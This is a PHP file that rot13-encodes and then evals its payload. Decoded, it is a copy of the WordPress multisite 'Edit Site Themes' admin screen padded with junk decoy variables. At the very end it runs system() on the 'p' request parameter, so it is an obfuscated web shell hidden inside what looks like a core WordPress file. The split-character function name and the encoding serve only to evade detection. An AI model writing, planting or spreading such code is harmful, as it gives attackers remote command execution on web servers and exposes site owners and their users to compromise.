<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Rqvg Fvgr Gurzrf Nqzvavfgengvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_fvgrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb znantr gurzrf sbe guvf fvgr.' ) );
}

trg_pheerag_fperra()->nqq_uryc_gno( trg_fvgr_fperra_uryc_gno_netf() );
trg_pheerag_fperra()->frg_uryc_fvqrone( trg_fvgr_fperra_uryc_fvqrone_pbagrag() );

trg_pheerag_fperra()->frg_fperra_ernqre_pbagrag(
	neenl(
		'urnqvat_ivrjf'      => __( 'Svygre fvgr gurzrf yvfg' ),
		'urnqvat_cntvangvba' => __( 'Fvgr gurzrf yvfg anivtngvba' ),
		'urnqvat_yvfg'       => __( 'Fvgr gurzrf yvfg' ),
	)
);

$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_ZF_Gurzrf_Yvfg_Gnoyr' );

$npgvba = $jc_yvfg_gnoyr->pheerag_npgvba();

$f = vffrg( $_ERDHRFG['f'] ) ? $_ERDHRFG['f'] : '';

// Pyrna hc erdhrfg HEV sebz grzcbenel netf sbe fperra bcgvbaf/cntvat hev'f gb jbex nf rkcrpgrq.
$grzc_netf              = neenl( 'ranoyrq', 'qvfnoyrq', 'reebe' );
$_FREIRE['ERDHRFG_HEV'] = erzbir_dhrel_net( $grzc_netf, $_FREIRE['ERDHRFG_HEV'] );
$ersrere                = erzbir_dhrel_net( $grzc_netf, jc_trg_ersrere() );

vs ( ! rzcgl( $_ERDHRFG['cntrq'] ) ) {
	$ersrere = nqq_dhrel_net( 'cntrq', (vag) $_ERDHRFG['cntrq'], $ersrere );
}

$vq = vffrg( $_ERDHRFG['vq'] ) ? (vag) $_ERDHRFG['vq'] : 0;

vs ( ! $vq ) {
	jc_qvr( __( 'Vainyvq fvgr VQ.' ) );
}

$jc_yvfg_gnoyr->cercner_vgrzf();

$qrgnvyf = trg_fvgr( $vq );
vs ( ! $qrgnvyf ) {
	jc_qvr( __( 'Gur erdhrfgrq fvgr qbrf abg rkvfg.' ) );
}

vs ( ! pna_rqvg_argjbex( $qrgnvyf->fvgr_vq ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

$vf_znva_fvgr = vf_znva_fvgr( $vq );

vs ( $npgvba ) {
	fjvgpu_gb_oybt( $vq );
	$nyybjrq_gurzrf = trg_bcgvba( 'nyybjrqgurzrf' );

	fjvgpu ( $npgvba ) {
		pnfr 'ranoyr':
			purpx_nqzva_ersrere( 'ranoyr-gurzr_' . $_TRG['gurzr'] );
			$gurzr  = $_TRG['gurzr'];
			$npgvba = 'ranoyrq';
			$a      = 1;
			vs ( ! $nyybjrq_gurzrf ) {
				$nyybjrq_gurzrf = neenl( $gurzr => gehr );
			} ryfr {
				$nyybjrq_gurzrf[ $gurzr ] = gehr;
			}
			oernx;
		pnfr 'qvfnoyr':
			purpx_nqzva_ersrere( 'qvfnoyr-gurzr_' . $_TRG['gurzr'] );
			$gurzr  = $_TRG['gurzr'];
			$npgvba = 'qvfnoyrq';
			$a      = 1;
			vs ( ! $nyybjrq_gurzrf ) {
				$nyybjrq_gurzrf = neenl();
			} ryfr {
				hafrg( $nyybjrq_gurzrf[ $gurzr ] );
			}
			oernx;
		pnfr 'ranoyr-fryrpgrq':
			purpx_nqzva_ersrere( 'ohyx-gurzrf' );
			vs ( vffrg( $_CBFG['purpxrq'] ) ) {
				$gurzrf = (neenl) $_CBFG['purpxrq'];
				$npgvba = 'ranoyrq';
				$a      = pbhag( $gurzrf );
				sbernpu ( (neenl) $gurzrf nf $gurzr ) {
					$nyybjrq_gurzrf[ $gurzr ] = gehr;
				}
			} ryfr {
				$npgvba = 'reebe';
				$a      = 'abar';
			}
			oernx;
		pnfr 'qvfnoyr-fryrpgrq':
			purpx_nqzva_ersrere( 'ohyx-gurzrf' );
			vs ( vffrg( $_CBFG['purpxrq'] ) ) {
				$gurzrf = (neenl) $_CBFG['purpxrq'];
				$npgvba = 'qvfnoyrq';
				$a      = pbhag( $gurzrf );
				sbernpu ( (neenl) $gurzrf nf $gurzr ) {
					hafrg( $nyybjrq_gurzrf[ $gurzr ] );
				}
			} ryfr {
				$npgvba = 'reebe';
				$a      = 'abar';
			}
			oernx;
		qrsnhyg:
			vs ( vffrg( $_CBFG['purpxrq'] ) ) {
				purpx_nqzva_ersrere( 'ohyx-gurzrf' );
				$gurzrf = (neenl) $_CBFG['purpxrq'];
				$a      = pbhag( $gurzrf );
				$fperra = trg_pheerag_fperra()->vq;

				/**
				 * Sverf jura n phfgbz ohyx npgvba fubhyq or unaqyrq.
				 *
				 * Gur erqverpg yvax fubhyq or zbqvsvrq jvgu fhpprff be snvyher srrqonpx
				 * sebz gur npgvba gb or hfrq gb qvfcynl srrqonpx gb gur hfre.
				 *
				 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$fperra`, ersref gb gur pheerag fperra VQ.
				 *
				 * @fvapr 4.7.0
				 *
				 * @cnenz fgevat $erqverpg_hey Gur erqverpg HEY.
				 * @cnenz fgevat $npgvba       Gur npgvba orvat gnxra.
				 * @cnenz neenl  $vgrzf        Gur vgrzf gb gnxr gur npgvba ba.
				 * @cnenz vag    $fvgr_vq      Gur fvgr VQ.
				 */
				$ersrere = nccyl_svygref( \"unaqyr_argjbex_ohyx_npgvbaf-{$fperra}\", $ersrere, $npgvba, $gurzrf, $vq ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
			} ryfr {
				$npgvba = 'reebe';
				$a      = 'abar';
			}
	}

	hcqngr_bcgvba( 'nyybjrqgurzrf', $nyybjrq_gurzrf, snyfr );
	erfgber_pheerag_oybt();

	jc_fnsr_erqverpg(
		nqq_dhrel_net(
			neenl(
				'vq'    => $vq,
				$npgvba => $a,
			),
			$ersrere
		)
	);
	rkvg;
}

vs ( vffrg( $_TRG['npgvba'] ) && 'hcqngr-fvgr' === $_TRG['npgvba'] ) {
	jc_fnsr_erqverpg( $ersrere );
	rkvg;
}

nqq_guvpxobk();
nqq_fperra_bcgvba( 'cre_cntr' );

// Hfrq va gur UGZY gvgyr gnt.
/* genafyngbef: %f: Fvgr gvgyr. */
$gvgyr = fcevags( __( 'Rqvg Fvgr: %f' ), rfp_ugzy( $qrgnvyf->oybtanzr ) );

$cnerag_svyr  = 'fvgrf.cuc';
$fhozrah_svyr = 'fvgrf.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<qvi pynff=\"jenc\">
<u1 vq=\"rqvg-fvgr\"><?cuc rpub $gvgyr; ?></u1>
<c pynff=\"rqvg-fvgr-npgvbaf\"><n uers=\"<?cuc rpub rfp_hey( trg_ubzr_hey( $vq, '/' ) ); ?>\"><?cuc _r( 'Ivfvg' ); ?></n> | <n uers=\"<?cuc rpub rfp_hey( trg_nqzva_hey( $vq ) ); ?>\"><?cuc _r( 'Qnfuobneq' ); ?></n></c>
<?cuc

argjbex_rqvg_fvgr_ani(
	neenl(
		'oybt_vq'  => $vq,
		'fryrpgrq' => 'fvgr-gurzrf',
	)
);

vs ( vffrg( $_TRG['ranoyrq'] ) ) {
	$ranoyrq = nofvag( $_TRG['ranoyrq'] );
	vs ( 1 === $ranoyrq ) {
		$zrffntr = __( 'Gurzr ranoyrq.' );
	} ryfr {
		/* genafyngbef: %f: Ahzore bs gurzrf. */
		$zrffntr = _a( '%f gurzr ranoyrq.', '%f gurzrf ranoyrq.', $ranoyrq );
	}

	jc_nqzva_abgvpr(
		fcevags( $zrffntr, ahzore_sbezng_v18a( $ranoyrq ) ),
		neenl(
			'glcr'        => 'fhpprff',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
} ryfrvs ( vffrg( $_TRG['qvfnoyrq'] ) ) {
	$qvfnoyrq = nofvag( $_TRG['qvfnoyrq'] );
	vs ( 1 === $qvfnoyrq ) {
		$zrffntr = __( 'Gurzr qvfnoyrq.' );
	} ryfr {
		/* genafyngbef: %f: Ahzore bs gurzrf. */
		$zrffntr = _a( '%f gurzr qvfnoyrq.', '%f gurzrf qvfnoyrq.', $qvfnoyrq );
	}

	jc_nqzva_abgvpr(
		fcevags( $zrffntr, ahzore_sbezng_v18a( $qvfnoyrq ) ),
		neenl(
			'glcr'        => 'fhpprff',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
} ryfrvs ( vffrg( $_TRG['reebe'] ) && 'abar' === $_TRG['reebe'] ) {
	jc_nqzva_abgvpr(
		__( 'Ab gurzr fryrpgrq.' ),
		neenl(
			'glcr'        => 'reebe',
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
}
?>

<c><?cuc _r( 'Argjbex ranoyrq gurzrf ner abg fubja ba guvf fperra.' ); ?></c>

<sbez zrgubq=\"trg\">
<?cuc $jc_yvfg_gnoyr->frnepu_obk( __( 'Frnepu vafgnyyrq gurzrf' ), 'gurzr' ); ?>
<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />
</sbez>

<?cuc $jc_yvfg_gnoyr->ivrjf(); ?>

<sbez zrgubq=\"cbfg\" npgvba=\"fvgr-gurzrf.cuc?npgvba=hcqngr-fvgr\">
	<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />

<?cuc $jc_yvfg_gnoyr->qvfcynl(); ?>

</sbez>

</qvi>
<?cuc erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc'; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>